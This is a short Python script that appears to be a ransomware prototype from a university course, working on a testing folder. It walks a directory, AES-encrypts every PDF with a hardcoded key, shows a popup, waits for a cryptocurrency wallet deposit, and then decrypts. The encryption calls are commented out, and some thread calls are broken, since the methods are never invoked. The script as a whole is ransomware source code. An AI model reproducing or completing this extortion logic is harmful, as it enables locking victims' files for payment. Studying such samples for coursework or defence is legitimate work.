from base64 import encode
import os
import threading
from util.AES import aes
from util.checkWallet import CheckWallet
from util.popup import PopUp


a = aes(b'6969696969696969', b'4242424242424242')
def encodeFiles(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(".pdf"):
                currentFile = os.path.join(root, file)
                a.encrypt(currentFile)
                # print(currentFile)


def decodeFiles(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(".pdf"):
                currentFile = os.path.join(root, file)
                a.decrypt(currentFile)

path = "../../testing/cosc469-testing-data"
# encodeFiles(path)
pu = PopUp()
print("Files have been encrypted!")
cw = CheckWallet()
t = threading.Thread(target=pu.mainloop)
t.start
if cw.waitForDeposit():
    pass
    # decodeFiles(path)
print("Files have been decrypted!")
t.join

